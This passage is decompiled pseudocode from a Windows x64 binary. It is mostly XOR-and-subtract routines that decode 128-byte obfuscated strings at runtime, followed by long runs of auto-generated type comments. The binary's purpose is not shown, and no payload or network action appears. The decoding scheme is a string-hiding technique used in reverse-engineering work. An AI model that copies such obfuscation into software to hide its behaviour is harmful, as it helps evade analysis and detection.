    byte_1400DC4DF = (v5 - 15) ^ 0x29;
    byte_1400DC4E0 = (v5 - 16) ^ 0xA2;
    byte_1400DC4E1 = (v5 - 17) ^ 0x6E;
    byte_1400DC4E2 = (v5 - 18) ^ 0xB;
    byte_1400DC4E3 = (v5 - 19) ^ 6;
    byte_1400DC4E4 = (v5 - 20) ^ 0x61;
    byte_1400DC4E5 = (v5 - 21) ^ 0x72;
    byte_1400DC4E6 = (v5 - 22) ^ 0xC7;
    byte_1400DC4E7 = (v5 - 23) ^ 0xB5;
    byte_1400DC4E8 = (v5 - 24) ^ 0xEB;
    byte_1400DC4E9 = (v5 - 25) ^ 0x2A;
    byte_1400DC4EA = (v5 - 26) ^ 0x89;
    byte_1400DC4EB = (v5 - 27) ^ 0xF0;
    byte_1400DC4EC = (v5 - 28) ^ 0x31;
    byte_1400DC4ED = (v5 - 29) ^ 0x5C;
    byte_1400DC4EE = (v5 - 30) ^ 0x5F;
    byte_1400DC4EF = (v5 - 31) ^ 0x93;
    byte_1400DC4F0 = (v5 - 32) ^ 0x80;
    byte_1400DC4F1 = (v5 - 33) ^ 0x9B;
    byte_1400DC4F2 = (v5 - 34) ^ 4;
    byte_1400DC4F3 = (v5 - 35) ^ 0x22;
    byte_1400DC4F4 = (v5 - 36) ^ 0xF5;
    byte_1400DC4F5 = (v5 - 37) ^ 0xCF;
    byte_1400DC4F6 = (v5 - 38) ^ 0x29;
    byte_1400DC4F7 = (v5 - 39) ^ 0x4D;
    byte_1400DC4F8 = (v5 - 40) ^ 3;
    byte_1400DC4F9 = (v5 - 41) ^ 0x26;
    byte_1400DC4FA = (v5 - 42) ^ 0xB1;
    byte_1400DC4FB = (v5 - 43) ^ 0x7B;
    byte_1400DC4FC = (v5 - 44) ^ 0x5F;
    byte_1400DC4FD = (v5 - 45) ^ 0x25;
    byte_1400DC4FE = (v5 - 46) ^ 0x53;
    byte_1400DC4FF = (v5 - 47) ^ 0x40;
    byte_1400DC500 = (v5 - 48) ^ 0xAD;
    byte_1400DC501 = (v5 - 49) ^ 0xB1;
    byte_1400DC502 = (v5 - 50) ^ 4;
    byte_1400DC503 = (v5 - 51) ^ 0x93;
    byte_1400DC504 = (v5 - 52) ^ 3;
    byte_1400DC505 = (v5 - 53) ^ 0x8F;
    byte_1400DC506 = (v5 - 54) ^ 0xE8;
    byte_1400DC507 = (v5 - 55) ^ 0x64;
    byte_1400DC508 = (v5 - 56) ^ 0x89;
    byte_1400DC509 = (v5 - 57) ^ 0x76;
    byte_1400DC50A = (v5 - 58) ^ 0xC4;
    byte_1400DC50B = (v5 - 59) ^ 0x37;
    byte_1400DC50C = (v5 - 60) ^ 0x9E;
    byte_1400DC50D = (v5 - 61) ^ 0x8C;
    byte_1400DC50E = (v5 - 62) ^ 0x5A;
    byte_1400DC50F = (v5 - 63) ^ 0x2B;
    byte_1400DC510 = (v5 - 64) ^ 0x5B;
    byte_1400DC511 = (v5 - 65) ^ 0xFE;
    byte_1400DC512 = (v5 - 66) ^ 0x8C;
    byte_1400DC513 = (v5 - 67) ^ 0xFC;
    byte_1400DC514 = (v5 - 68) ^ 0x44;
    byte_1400DC515 = (v5 - 69) ^ 0xF3;
    byte_1400DC516 = (v5 - 70) ^ 0xF3;
    byte_1400DC517 = (v5 - 71) ^ 0x5B;
    byte_1400DC518 = (v5 - 72) ^ 0x24;
    byte_1400DC519 = (v5 - 73) ^ 0x7C;
    byte_1400DC51A = (v5 - 74) ^ 2;
    byte_1400DC51B = (v5 - 75) ^ 0xE;
    byte_1400DC51C = (v5 - 76) ^ 0xEB;
    byte_1400DC51D = (v5 - 77) ^ 0x48;
    byte_1400DC51E = (v5 - 78) ^ 0x72;
    byte_1400DC51F = (v5 - 79) ^ 0x6F;
    byte_1400DC520 = (v5 - 80) ^ 0xE4;
    byte_1400DC521 = (v5 - 81) ^ 0x83;
    byte_1400DC522 = (v5 - 82) ^ 0xB6;
    byte_1400DC523 = (v5 - 83) ^ 0xC5;
    byte_1400DC524 = (v5 - 84) ^ 0x91;
    byte_1400DC525 = (v5 - 85) ^ 0x8E;
    byte_1400DC526 = (v5 - 86) ^ 0xD1;
    byte_1400DC527 = (v5 - 87) ^ 0x61;
    byte_1400DC528 = (v5 - 88) ^ 0xED;
    byte_1400DC529 = (v5 - 89) ^ 0x2A;
    byte_1400DC52A = (v5 - 90) ^ 0x3C;
    byte_1400DC52B = (v5 - 91) ^ 0x6E;
    byte_1400DC52C = (v5 - 92) ^ 0x9A;
    byte_1400DC52D = (v5 - 93) ^ 0xC2;
    byte_1400DC52E = (v5 - 94) ^ 0xBD;
    byte_1400DC52F = (v5 - 95) ^ 0xA0;
    byte_1400DC530 = (v5 - 96) ^ 0x22;
    byte_1400DC531 = (v5 - 97) ^ 0xF3;
    byte_1400DC532 = (v5 - 98) ^ 0xCF;
    byte_1400DC533 = (v5 - 99) ^ 0x3D;
    byte_1400DC534 = (v5 - 100) ^ 0xE7;
    byte_1400DC535 = (v5 - 101) ^ 0x21;
    byte_1400DC536 = (v5 - 102) ^ 0xBE;
    byte_1400DC537 = (v5 - 103) ^ 0xE8;
    byte_1400DC538 = (v5 - 104) ^ 0xDF;
    byte_1400DC539 = (v5 - 105) ^ 0xDD;
    byte_1400DC53A = (v5 - 106) ^ 0xE3;
    byte_1400DC53B = (v5 - 107) ^ 0x2D;
    byte_1400DC53C = (v5 - 108) ^ 0xA0;
    byte_1400DC53D = (v5 - 109) ^ 0xBA;
    byte_1400DC53E = (v5 - 110) ^ 0x8E;
    byte_1400DC53F = (v5 - 111) ^ 0x70;
    byte_1400DC540 = (v5 - 112) ^ 0xB;
    byte_1400DC541 = (v5 - 113) ^ 0x77;
    byte_1400DC542 = (v5 - 114) ^ 0x9C;
    byte_1400DC543 = (v5 - 115) ^ 0xF9;
    byte_1400DC544 = (v5 - 116) ^ 0xCD;
    byte_1400DC545 = (v5 - 117) ^ 0xDD;
    byte_1400DC546 = (v5 - 118) ^ 0xB0;
    byte_1400DC547 = (v5 - 119) ^ 0xB1;
    byte_1400DC548 = (v5 - 120) ^ 9;
    byte_1400DC549 = (v5 - 121) ^ 0x5E;
    byte_1400DC54A = (v5 - 122) ^ 0x58;
    byte_1400DC54B = (v5 - 123) ^ 0xF9;
    byte_1400DC54C = (v5 - 124) ^ 0xF4;
    byte_1400DC54D = (v5 - 125) ^ 0xDD;
    byte_1400DC54E = (v5 - 126) ^ 0x61;
    byte_1400DC54F = (v5 - 127) ^ 0x6A;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x80ui64 )
  {
    sub_140004790(Src, 0x80ui64, 0i64);
    v5 = byte_1400DC4C0;
  }
  if ( (unsigned __int64)v3[3] < 0x10 )
    v6 = v3;
  else
    v6 = *v3;
  memset(v6, 0, 0x80ui64);
  v7 = (unsigned __int64)v3[3] < 0x10;
  v3[2] = (void *)128;
  if ( v7 )
    v8 = v3;
  else
    v8 = (void **)*v3;
  *((_BYTE *)v8 + 128) = 0;
  v9 = 0i64;
  do
  {
    if ( (unsigned __int64)v3[3] < 0x10 )
      v10 = v3;
    else
      v10 = (void **)*v3;
    v11 = byte_1400DC4D0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x80 );
  return v3;
}
// 1400DC370: using guessed type int dword_1400DC370;
// 1400DC374: using guessed type int dword_1400DC374;
// 1400DC378: using guessed type int dword_1400DC378;
// 1400DC37C: using guessed type int dword_1400DC37C;
// 1400DC4C0: using guessed type char byte_1400DC4C0;
// 1400DC4C4: using guessed type int dword_1400DC4C4;
// 1400DC4D1: using guessed type char byte_1400DC4D1;
// 1400DC4D2: using guessed type char byte_1400DC4D2;
// 1400DC4D3: using guessed type char byte_1400DC4D3;
// 1400DC4D4: using guessed type char byte_1400DC4D4;
// 1400DC4D5: using guessed type char byte_1400DC4D5;
// 1400DC4D6: using guessed type char byte_1400DC4D6;
// 1400DC4D7: using guessed type char byte_1400DC4D7;
// 1400DC4D8: using guessed type char byte_1400DC4D8;
// 1400DC4D9: using guessed type char byte_1400DC4D9;
// 1400DC4DA: using guessed type char byte_1400DC4DA;
// 1400DC4DB: using guessed type char byte_1400DC4DB;
// 1400DC4DC: using guessed type char byte_1400DC4DC;
// 1400DC4DD: using guessed type char byte_1400DC4DD;
// 1400DC4DE: using guessed type char byte_1400DC4DE;
// 1400DC4DF: using guessed type char byte_1400DC4DF;
// 1400DC4E0: using guessed type char byte_1400DC4E0;
// 1400DC4E1: using guessed type char byte_1400DC4E1;
// 1400DC4E2: using guessed type char byte_1400DC4E2;
// 1400DC4E3: using guessed type char byte_1400DC4E3;
// 1400DC4E4: using guessed type char byte_1400DC4E4;
// 1400DC4E5: using guessed type char byte_1400DC4E5;
// 1400DC4E6: using guessed type char byte_1400DC4E6;
// 1400DC4E7: using guessed type char byte_1400DC4E7;
// 1400DC4E8: using guessed type char byte_1400DC4E8;
// 1400DC4E9: using guessed type char byte_1400DC4E9;
// 1400DC4EA: using guessed type char byte_1400DC4EA;
// 1400DC4EB: using guessed type char byte_1400DC4EB;
// 1400DC4EC: using guessed type char byte_1400DC4EC;
// 1400DC4ED: using guessed type char byte_1400DC4ED;
// 1400DC4EE: using guessed type char byte_1400DC4EE;
// 1400DC4EF: using guessed type char byte_1400DC4EF;
// 1400DC4F0: using guessed type char byte_1400DC4F0;
// 1400DC4F1: using guessed type char byte_1400DC4F1;
// 1400DC4F2: using guessed type char byte_1400DC4F2;
// 1400DC4F3: using guessed type char byte_1400DC4F3;
// 1400DC4F4: using guessed type char byte_1400DC4F4;
// 1400DC4F5: using guessed type char byte_1400DC4F5;
// 1400DC4F6: using guessed type char byte_1400DC4F6;
// 1400DC4F7: using guessed type char byte_1400DC4F7;
// 1400DC4F8: using guessed type char byte_1400DC4F8;
// 1400DC4F9: using guessed type char byte_1400DC4F9;
// 1400DC4FA: using guessed type char byte_1400DC4FA;
// 1400DC4FB: using guessed type char byte_1400DC4FB;
// 1400DC4FC: using guessed type char byte_1400DC4FC;
// 1400DC4FD: using guessed type char byte_1400DC4FD;
// 1400DC4FE: using guessed type char byte_1400DC4FE;
// 1400DC4FF: using guessed type char byte_1400DC4FF;
// 1400DC500: using guessed type char byte_1400DC500;
// 1400DC501: using guessed type char byte_1400DC501;
// 1400DC502: using guessed type char byte_1400DC502;
// 1400DC503: using guessed type char byte_1400DC503;
// 1400DC504: using guessed type char byte_1400DC504;
// 1400DC505: using guessed type char byte_1400DC505;
// 1400DC506: using guessed type char byte_1400DC506;
// 1400DC507: using guessed type char byte_1400DC507;
// 1400DC508: using guessed type char byte_1400DC508;
// 1400DC509: using guessed type char byte_1400DC509;
// 1400DC50A: using guessed type char byte_1400DC50A;
// 1400DC50B: using guessed type char byte_1400DC50B;
// 1400DC50C: using guessed type char byte_1400DC50C;
// 1400DC50D: using guessed type char byte_1400DC50D;
// 1400DC50E: using guessed type char byte_1400DC50E;
// 1400DC50F: using guessed type char byte_1400DC50F;
// 1400DC510: using guessed type char byte_1400DC510;
// 1400DC511: using guessed type char byte_1400DC511;
// 1400DC512: using guessed type char byte_1400DC512;
// 1400DC513: using guessed type char byte_1400DC513;
// 1400DC514: using guessed type char byte_1400DC514;
// 1400DC515: using guessed type char byte_1400DC515;
// 1400DC516: using guessed type char byte_1400DC516;
// 1400DC517: using guessed type char byte_1400DC517;
// 1400DC518: using guessed type char byte_1400DC518;
// 1400DC519: using guessed type char byte_1400DC519;
// 1400DC51A: using guessed type char byte_1400DC51A;
// 1400DC51B: using guessed type char byte_1400DC51B;
// 1400DC51C: using guessed type char byte_1400DC51C;
// 1400DC51D: using guessed type char byte_1400DC51D;
// 1400DC51E: using guessed type char byte_1400DC51E;
// 1400DC51F: using guessed type char byte_1400DC51F;
// 1400DC520: using guessed type char byte_1400DC520;
// 1400DC521: using guessed type char byte_1400DC521;
// 1400DC522: using guessed type char byte_1400DC522;
// 1400DC523: using guessed type char byte_1400DC523;
// 1400DC524: using guessed type char byte_1400DC524;
// 1400DC525: using guessed type char byte_1400DC525;
// 1400DC526: using guessed type char byte_1400DC526;
// 1400DC527: using guessed type char byte_1400DC527;
// 1400DC528: using guessed type char byte_1400DC528;
// 1400DC529: using guessed type char byte_1400DC529;
// 1400DC52A: using guessed type char byte_1400DC52A;
// 1400DC52B: using guessed type char byte_1400DC52B;
// 1400DC52C: using guessed type char byte_1400DC52C;
// 1400DC52D: using guessed type char byte_1400DC52D;
// 1400DC52E: using guessed type char byte_1400DC52E;
// 1400DC52F: using guessed type char byte_1400DC52F;
// 1400DC530: using guessed type char byte_1400DC530;
// 1400DC531: using guessed type char byte_1400DC531;
// 1400DC532: using guessed type char byte_1400DC532;
// 1400DC533: using guessed type char byte_1400DC533;
// 1400DC534: using guessed type char byte_1400DC534;
// 1400DC535: using guessed type char byte_1400DC535;
// 1400DC536: using guessed type char byte_1400DC536;
// 1400DC537: using guessed type char byte_1400DC537;
// 1400DC538: using guessed type char byte_1400DC538;
// 1400DC539: using guessed type char byte_1400DC539;
// 1400DC53A: using guessed type char byte_1400DC53A;
// 1400DC53B: using guessed type char byte_1400DC53B;
// 1400DC53C: using guessed type char byte_1400DC53C;
// 1400DC53D: using guessed type char byte_1400DC53D;
// 1400DC53E: using guessed type char byte_1400DC53E;
// 1400DC53F: using guessed type char byte_1400DC53F;
// 1400DC540: using guessed type char byte_1400DC540;
// 1400DC541: using guessed type char byte_1400DC541;
// 1400DC542: using guessed type char byte_1400DC542;
// 1400DC543: using guessed type char byte_1400DC543;
// 1400DC544: using guessed type char byte_1400DC544;
// 1400DC545: using guessed type char byte_1400DC545;
// 1400DC546: using guessed type char byte_1400DC546;
// 1400DC547: using guessed type char byte_1400DC547;
// 1400DC548: using guessed type char byte_1400DC548;
// 1400DC549: using guessed type char byte_1400DC549;
// 1400DC54A: using guessed type char byte_1400DC54A;
// 1400DC54B: using guessed type char byte_1400DC54B;
// 1400DC54C: using guessed type char byte_1400DC54C;
// 1400DC54D: using guessed type char byte_1400DC54D;
// 1400DC54E: using guessed type char byte_1400DC54E;
// 1400DC54F: using guessed type char byte_1400DC54F;

//----- (00000001400856E0) ----------------------------------------------------
void **__fastcall sub_1400856E0(void *Src)
{
  int v1; // er9
  unsigned int v2; // edi
  void **v3; // rbx
  int v4; // esi
  char v5; // si
  void *v6; // rcx
  bool v7; // cf
  void **v8; // rax
  __int64 v9; // rdx
  void **v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC554;
  v2 = 0;
  v3 = (void **)Src;
  if ( dword_1400DC554 & 1 )
  {
    v5 = byte_1400DC550;
  }
  else
  {
    v4 = 69069 * dword_1400DC378 + 1234567;
    v1 = dword_1400DC554 | 1;
    dword_1400DC378 = v4;
    dword_1400DC554 |= 1u;
    dword_1400DC370 = HIWORD(dword_1400DC370) + 36969 * (unsigned __int16)dword_1400DC370;
    LOBYTE(v4) = (BYTE2(dword_1400DC37C) + 80 * dword_1400DC37C) ^ v4;
    dword_1400DC37C = HIWORD(dword_1400DC37C) + 18000 * (unsigned __int16)dword_1400DC37C;
    v5 = (((unsigned int)dword_1400DC374 >> 13) ^ 32 * dword_1400DC374 ^ dword_1400DC374) + v4;
    dword_1400DC374 ^= ((unsigned int)dword_1400DC374 >> 13) ^ 32 * (dword_1400DC374 ^ (dword_1400DC374 << 12));
    byte_1400DC550 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC554 = v1 | 2;
    byte_1400DC560[0] = v5 ^ 0x2C;
    byte_1400DC561 = (v5 - 1) ^ 0xD5;
    byte_1400DC562 = (v5 - 2) ^ 1;
    byte_1400DC563 = (v5 - 3) ^ 0xE3;
    byte_1400DC564 = (v5 - 4) ^ 0xF0;
    byte_1400DC565 = (v5 - 5) ^ 0xBA;
    byte_1400DC566 = (v5 - 6) ^ 0x39;
    byte_1400DC567 = (v5 - 7) ^ 0xB2;
    byte_1400DC568 = (v5 - 8) ^ 0xA9;
    byte_1400DC569 = (v5 - 9) ^ 0x82;
    byte_1400DC56A = (v5 - 10) ^ 0x48;
    byte_1400DC56B = ~(v5 - 11);
    byte_1400DC56C = (v5 - 12) ^ 0x2C;
    byte_1400DC56D = (v5 - 13) ^ 0xF;
    byte_1400DC56E = (v5 - 14) ^ 0x85;
    byte_1400DC56F = (v5 - 15) ^ 0x3D;
    byte_1400DC570 = (v5 - 16) ^ 0x31;
    byte_1400DC571 = (v5 - 17) ^ 0xEB;
    byte_1400DC572 = (v5 - 18) ^ 0xE1;
    byte_1400DC573 = (v5 - 19) ^ 0xC6;
    byte_1400DC574 = (v5 - 20) ^ 0xBE;
    byte_1400DC575 = (v5 - 21) ^ 0xF;
    byte_1400DC576 = (v5 - 22) ^ 0xC6;
    byte_1400DC577 = (v5 - 23) ^ 0xD7;
    byte_1400DC578 = (v5 - 24) ^ 0x98;
    byte_1400DC579 = (v5 - 25) ^ 0x71;
    byte_1400DC57A = (v5 - 26) ^ 0x64;
    byte_1400DC57B = (v5 - 27) ^ 0x74;
    byte_1400DC57C = (v5 - 28) ^ 0xB1;
    byte_1400DC57D = (v5 - 29) ^ 0x9D;
    byte_1400DC57E = (v5 - 30) ^ 0x8A;
    byte_1400DC57F = (v5 - 31) ^ 0x32;
    byte_1400DC580 = (v5 - 32) ^ 0x72;
    byte_1400DC581 = (v5 - 33) ^ 0x70;
    byte_1400DC582 = (v5 - 34) ^ 0x7B;
    byte_1400DC583 = (v5 - 35) ^ 0xF0;
    byte_1400DC584 = (v5 - 36) ^ 0x99;
    byte_1400DC585 = (v5 - 37) ^ 0xF;
    byte_1400DC586 = (v5 - 38) ^ 0x16;
    byte_1400DC587 = (v5 - 39) ^ 0x55;
    byte_1400DC588 = (v5 - 40) ^ 0x79;
    byte_1400DC589 = (v5 - 41) ^ 0x76;
    byte_1400DC58A = (v5 - 42) ^ 0x7A;
    byte_1400DC58B = (v5 - 43) ^ 0x5B;
    byte_1400DC58C = (v5 - 44) ^ 0x42;
    byte_1400DC58D = (v5 - 45) ^ 0xD;
    byte_1400DC58E = (v5 - 46) ^ 0x56;
    byte_1400DC58F = (v5 - 47) ^ 0x14;
    byte_1400DC590 = (v5 - 48) ^ 0x1D;
    byte_1400DC591 = (v5 - 49) ^ 0xD6;
    byte_1400DC592 = (v5 - 50) ^ 0xA1;
    byte_1400DC593 = (v5 - 51) ^ 0x84;
    byte_1400DC594 = (v5 - 52) ^ 0x8C;
    byte_1400DC595 = (v5 - 53) ^ 0xB7;
    byte_1400DC596 = (v5 - 54) ^ 0xAF;
    byte_1400DC597 = (v5 - 55) ^ 0x9D;
    byte_1400DC598 = (v5 - 56) ^ 0x1F;
    byte_1400DC599 = (v5 - 57) ^ 0x85;
    byte_1400DC59A = (v5 - 58) ^ 0x16;
    byte_1400DC59B = (v5 - 59) ^ 0xF4;
    byte_1400DC59C = (v5 - 60) ^ 0x83;
    byte_1400DC59D = (v5 - 61) ^ 0xC5;
    byte_1400DC59E = (v5 - 62) ^ 0xA6;
    byte_1400DC59F = (v5 - 63) ^ 0x9F;
    byte_1400DC5A0 = (v5 - 64) ^ 0x66;
    byte_1400DC5A1 = (v5 - 65) ^ 0xD9;
    byte_1400DC5A2 = (v5 - 66) ^ 4;
    byte_1400DC5A3 = (v5 - 67) ^ 8;
    byte_1400DC5A4 = (v5 - 68) ^ 0x50;
    byte_1400DC5A5 = (v5 - 69) ^ 0x82;
    byte_1400DC5A6 = (v5 - 70) ^ 0xED;
    byte_1400DC5A7 = (v5 - 71) ^ 0x6A;
    byte_1400DC5A8 = (v5 - 72) ^ 0xFC;
    byte_1400DC5A9 = (v5 - 73) ^ 0x3F;
    byte_1400DC5AA = (v5 - 74) ^ 0x10;
    byte_1400DC5AB = (v5 - 75) ^ 0x1E;
    byte_1400DC5AC = (v5 - 76) ^ 0xE8;
    byte_1400DC5AD = (v5 - 77) ^ 0xA6;
    byte_1400DC5AE = (v5 - 78) ^ 0x71;
    byte_1400DC5AF = (v5 - 79) ^ 0xBB;
    byte_1400DC5B0 = (v5 - 80) ^ 0xB7;
    byte_1400DC5B1 = (v5 - 81) ^ 0x29;
    byte_1400DC5B2 = (v5 - 82) ^ 0xDB;
    byte_1400DC5B3 = (v5 - 83) ^ 0xC0;
    byte_1400DC5B4 = (v5 - 84) ^ 0x77;
    byte_1400DC5B5 = (v5 - 85) ^ 0xEC;
    byte_1400DC5B6 = (v5 - 86) ^ 0xF;
    byte_1400DC5B7 = (v5 - 87) ^ 0x17;
    byte_1400DC5B8 = (v5 - 88) ^ 0x2E;
    byte_1400DC5B9 = (v5 - 89) ^ 0x73;
    byte_1400DC5BA = v5 - 90;
    byte_1400DC5BB = (v5 - 91) ^ 0x94;
    byte_1400DC5BC = (v5 - 92) ^ 0xEC;
    byte_1400DC5BD = (v5 - 93) ^ 0x5A;
    byte_1400DC5BE = (v5 - 94) ^ 0xAF;
    byte_1400DC5BF = (v5 - 95) ^ 0x3A;
    byte_1400DC5C0 = (v5 - 96) ^ 0xDD;
    byte_1400DC5C1 = (v5 - 97) ^ 0x19;
    byte_1400DC5C2 = (v5 - 98) ^ 0x9C;
    byte_1400DC5C3 = (v5 - 99) ^ 0x7D;
    byte_1400DC5C4 = (v5 - 100) ^ 0x89;
    byte_1400DC5C5 = (v5 - 101) ^ 0xF5;
    byte_1400DC5C6 = (v5 - 102) ^ 0x46;
    byte_1400DC5C7 = ~(v5 - 103);
    byte_1400DC5C8 = (v5 - 104) ^ 0x6C;
    byte_1400DC5C9 = (v5 - 105) ^ 0xCC;
    byte_1400DC5CA = (v5 - 106) ^ 0xE7;
    byte_1400DC5CB = (v5 - 107) ^ 0xF3;
    byte_1400DC5CC = (v5 - 108) ^ 0xF3;
    byte_1400DC5CD = (v5 - 109) ^ 0x33;
    byte_1400DC5CE = (v5 - 110) ^ 0xC1;
    byte_1400DC5CF = (v5 - 111) ^ 0x3E;
    byte_1400DC5D0 = (v5 - 112) ^ 0xD0;
    byte_1400DC5D1 = (v5 - 113) ^ 0x10;
    byte_1400DC5D2 = (v5 - 114) ^ 0x63;
    byte_1400DC5D3 = (v5 - 115) ^ 0xE3;
    byte_1400DC5D4 = (v5 - 116) ^ 0x13;
    byte_1400DC5D5 = (v5 - 117) ^ 0x9D;
    byte_1400DC5D6 = (v5 - 118) ^ 0x41;
    byte_1400DC5D7 = (v5 - 119) ^ 0xA4;
    byte_1400DC5D8 = (v5 - 120) ^ 0xA;
    byte_1400DC5D9 = (v5 - 121) ^ 0x81;
    byte_1400DC5DA = (v5 - 122) ^ 0xD0;
    byte_1400DC5DB = (v5 - 123) ^ 0xFE;
    byte_1400DC5DC = (v5 - 124) ^ 0x83;
    byte_1400DC5DD = (v5 - 125) ^ 0x45;
    byte_1400DC5DE = (v5 - 126) ^ 0xD3;
    byte_1400DC5DF = (v5 - 127) ^ 0xAE;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x80ui64 )
  {
    sub_140004790(Src, 0x80ui64, 0i64);
    v5 = byte_1400DC550;
  }
  if ( (unsigned __int64)v3[3] < 0x10 )
    v6 = v3;
  else
    v6 = *v3;
  memset(v6, 0, 0x80ui64);
  v7 = (unsigned __int64)v3[3] < 0x10;
  v3[2] = (void *)128;
  if ( v7 )
    v8 = v3;
  else
    v8 = (void **)*v3;
  *((_BYTE *)v8 + 128) = 0;
  v9 = 0i64;
  do
  {
    if ( (unsigned __int64)v3[3] < 0x10 )
      v10 = v3;
    else
      v10 = (void **)*v3;
    v11 = byte_1400DC560[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x80 );
  return v3;
}
// 1400DC370: using guessed type int dword_1400DC370;
// 1400DC374: using guessed type int dword_1400DC374;
// 1400DC378: using guessed type int dword_1400DC378;
// 1400DC37C: using guessed type int dword_1400DC37C;
// 1400DC550: using guessed type char byte_1400DC550;
// 1400DC554: using guessed type int dword_1400DC554;
// 1400DC561: using guessed type char byte_1400DC561;
// 1400DC562: using guessed type char byte_1400DC562;
// 1400DC563: using guessed type char byte_1400DC563;
// 1400DC564: using guessed type char byte_1400DC564;
// 1400DC565: using guessed type char byte_1400DC565;
// 1400DC566: using guessed type char byte_1400DC566;
// 1400DC567: using guessed type char byte_1400DC567;
// 1400DC568: using guessed type char byte_1400DC568;
// 1400DC569: using guessed type char byte_1400DC569;
// 1400DC56A: using guessed type char byte_1400DC56A;
// 1400DC56B: using guessed type char byte_1400DC56B;
// 1400DC56C: using guessed type char byte_1400DC56C;
// 1400DC56D: using guessed type char byte_1400DC56D;
// 1400DC56E: using guessed type char byte_1400DC56E;
// 1400DC56F: using guessed type char byte_1400DC56F;
// 1400DC570: using guessed type char byte_1400DC570;
// 1400DC571: using guessed type char byte_1400DC571;
// 1400DC572: using guessed type char byte_1400DC572;
// 1400DC573: using guessed type char byte_1400DC573;
// 1400DC574: using guessed type char byte_1400DC574;
// 1400DC575: using guessed type char byte_1400DC575;
// 1400DC576: using guessed type char byte_1400DC576;
// 1400DC577: using guessed type char byte_1400DC577;
// 1400DC578: using guessed type char byte_1400DC578;
// 1400DC579: using guessed type char byte_1400DC579;
// 1400DC57A: using guessed type char byte_1400DC57A;
// 1400DC57B: using guessed type char byte_1400DC57B;
// 1400DC57C: using guessed type char byte_1400DC57C;
// 1400DC57D: using guessed type char byte_1400DC57D;
// 1400DC57E: using guessed type char byte_1400DC57E;
// 1400DC57F: using guessed type char byte_1400DC57F;
// 1400DC580: using guessed type char byte_1400DC580;
// 1400DC581: using guessed type char byte_1400DC581;
// 1400DC582: using guessed type char byte_1400DC582;
// 1400DC583: using guessed type char byte_1400DC583;
// 1400DC584: using guessed type char byte_1400DC584;
// 1400DC585: using guessed type char byte_1400DC585;
// 1400DC586: using guessed type char byte_1400DC586;
// 1400DC587: using guessed type char byte_1400DC587;
// 1400DC588: using guessed type char byte_1400DC588;
// 1400DC589: using guessed type char byte_1400DC589;
// 1400DC58A: using guessed type char byte_1400DC58A;
// 1400DC58B: using guessed type char byte_1400DC58B;
// 1400DC58C: using guessed type char byte_1400DC58C;
// 1400DC58D: using guessed type char byte_1400DC58D;
// 1400DC58E: using guessed type char byte_1400DC58E;
// 1400DC58F: using guessed type char byte_1400DC58F;
// 1400DC590: using guessed type char byte_1400DC590;
// 1400DC591: using guessed type char byte_1400DC591;
// 1400DC592: using guessed type char byte_1400DC592;
// 1400DC593: using guessed type char byte_1400DC593;
// 1400DC594: using guessed type char byte_1400DC594;
// 1400DC595: using guessed type char byte_1400DC595;
// 1400DC596: using guessed type char byte_1400DC596;
// 1400DC597: using guessed type char byte_1400DC597;
// 1400DC598: using guessed type char byte_1400DC598;
// 1400DC599: using guessed type char byte_1400DC599;
// 1400DC59A: using guessed type char byte_1400DC59A;
// 1400DC59B: using guessed type char byte_1400DC59B;
// 1400DC59C: using guessed type char byte_1400DC59C;
// 1400DC59D: using guessed type char byte_1400DC59D;
// 1400DC59E: using guessed type char byte_1400DC59E;
// 1400DC59F: using guessed type char byte_1400DC59F;
// 1400DC5A0: using guessed type char byte_1400DC5A0;
// 1400DC5A1: using guessed type char byte_1400DC5A1;
// 1400DC5A2: using guessed type char byte_1400DC5A2;
// 1400DC5A3: using guessed type char byte_1400DC5A3;
// 1400DC5A4: using guessed type char byte_1400DC5A4;
// 1400DC5A5: using guessed type char byte_1400DC5A5;
// 1400DC5A6: using guessed type char byte_1400DC5A6;
// 1400DC5A7: using guessed type char byte_1400DC5A7;
// 1400DC5A8: using guessed type char byte_1400DC5A8;
// 1400DC5A9: using guessed type char byte_1400DC5A9;
// 1400DC5AA: using guessed type char byte_1400DC5AA;
// 1400DC5AB: using guessed type char byte_1400DC5AB;
// 1400DC5AC: using guessed type char byte_1400DC5AC;
// 1400DC5AD: using guessed type char byte_1400DC5AD;
// 1400DC5AE: using guessed type char byte_1400DC5AE;
// 1400DC5AF: using guessed type char byte_1400DC5AF;
// 1400DC5B0: using guessed type char byte_1400DC5B0;
// 1400DC5B1: using guessed type char byte_1400DC5B1;
// 1400DC5B2: using guessed type char byte_1400DC5B2;
// 1400DC5B3: using guessed type char byte_1400DC5B3;
// 1400DC5B4: using guessed type char byte_1400DC5B4;
// 1400DC5B5: using guessed type char byte_1400DC5B5;
// 1400DC5B6: using guessed type char byte_1400DC5B6;
// 1400DC5B7: using guessed type char byte_1400DC5B7;
// 1400DC5B8: using guessed type char byte_1400DC5B8;
// 1400DC5B9: using guessed type char byte_1400DC5B9;
// 1400DC5BA: using guessed type char byte_1400DC5BA;
// 1400DC5BB: using guessed type char byte_1400DC5BB;
// 1400DC5BC: using guessed type char byte_1400DC5BC;
// 1400DC5BD: using guessed type char byte_1400DC5BD;
// 1400DC5BE: using guessed type char byte_1400DC5BE;
// 1400DC5BF: using guessed type char byte_1400DC5BF;
// 1400DC5C0: using guessed type char byte_1400DC5C0;
// 1400DC5C1: using guessed type char byte_1400DC5C1;
// 1400DC5C2: using guessed type char byte_1400DC5C2;
// 1400DC5C3: using guessed type char byte_1400DC5C3;
// 1400DC5C4: using guessed type char byte_1400DC5C4;
// 1400DC5C5: using guessed type char byte_1400DC5C5;
// 1400DC5C6: using guessed type char byte_1400DC5C6;
// 1400DC5C7: using guessed type char byte_1400DC5C7;
// 1400DC5C8: using guessed type char byte_1400DC5C8;
// 1400DC5C9: using guessed type char byte_1400DC5C9;
// 1400DC5CA: using guessed type char byte_1400DC5CA;
// 1400DC5CB: using guessed type char byte_1400DC5CB;
